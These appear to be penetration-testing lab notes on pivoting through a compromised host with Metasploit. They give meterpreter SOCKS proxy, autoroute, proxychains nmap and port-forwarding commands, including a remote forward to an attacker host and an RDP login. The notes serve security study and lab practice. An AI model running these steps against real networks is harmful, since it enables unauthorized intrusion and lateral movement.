>We open a socks proxy on pivot box, after compromising it using a `meterpreter` payload

```msfconsole
meterpreter > bg
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

`proxychains` config:

```sh
$ tail -2 /etc/proxychains4.conf
socks4  127.0.0.1 9050
```

Create route

```msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```

or, In the `meterpreter` shell. Same thing

```msfconsole
meterpreter > run autoroute -s 172.16.5.0/23
```

Now do things

```sh
proxychains nmap 172.16.5.19 -sT -v -Pn -F
```

## Port forward

### Local

```sh
portfwd add -l 3300 -r 172.16.5.19 -p 3389
```

>It means attacker host's port `3300` is now internal host's port `3389`

Interact:

```sh
xfreerdp3 /v:localhost:3300 /u:"$user" /p:"$pass"
```

### Remote

The IP is attacker host's IP

```sh
portfwd add -R -L 10.10.14.18 -l 8081 -p 1234
```

>This will make every traffics sent to pivot box's port `1234` will be forward to attacker host's port `8081`
